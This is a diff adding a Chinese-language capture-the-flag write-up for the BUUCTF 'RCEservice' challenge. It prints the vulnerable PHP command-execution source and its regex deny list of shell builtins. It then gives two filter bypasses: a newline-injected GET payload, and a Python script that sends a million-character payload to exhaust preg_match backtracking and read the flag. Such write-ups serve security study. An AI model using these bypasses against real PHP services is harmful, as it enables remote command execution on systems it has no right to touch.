@@ -584,3 +584,69 @@ payload:
 因为nickname的长度要<10,所以要把nickname转换成数组
 
 ![image-20240506235057793](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240506235057793.png)
+
+
+
+# buuctf RCEservice
+
+附上源码
+
+```
+<?php
+
+putenv('PATH=/home/rceservice/jail');
+
+if (isset($_REQUEST['cmd'])) {
+  $json = $_REQUEST['cmd'];
+
+  if (!is_string($json)) {
+    echo 'Hacking attempt detected<br/><br/>';
+  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
+    echo 'Hacking attempt detected<br/><br/>';
+  } else {
+    echo 'Attempting to run command:<br/>';
+    $cmd = json_decode($json, true)['cmd'];
+    if ($cmd !== NULL) {
+      system($cmd);
+    } else {
+      echo 'Invalid input';
+    }
+    echo '<br/><br/>';
+  }
+}
+
+?>
+```
+
+方法一:
+
+`putenv('PATH=/home/rceservice/jail');`
+
+修改了环境变量，所以只能使用绝对路径使用cat命令，`cat`命令在`/bin`文件夹下
+
+因为`preg_match`只能匹配第一行，所以这里可以采用多行绕过。
+
+具体payload:
+
+`?cmd={%0A"cmd":"ls /home/rceservice"%0A}`
+
+**注意:**当我直接在表单中提交会被过滤,使用get方式就不会被匹配到
+
+
+
+方法二:回溯
+
+**回溯.py**
+
+就是使用post提交一个超长的payload,从而绕过`preg_match`
+
+```
+import requests
+
+payload = '{"cmd":"/bin/cat /home/rceservice/flag","zz":"' + "a" * (1000000) + '"}'
+
+res = requests.post("http://5881937a-a9b5-4d44-84f2-844ed296aecd.node5.buuoj.cn:81/", data={"cmd": payload})
+print(res.text)
+
+```
+
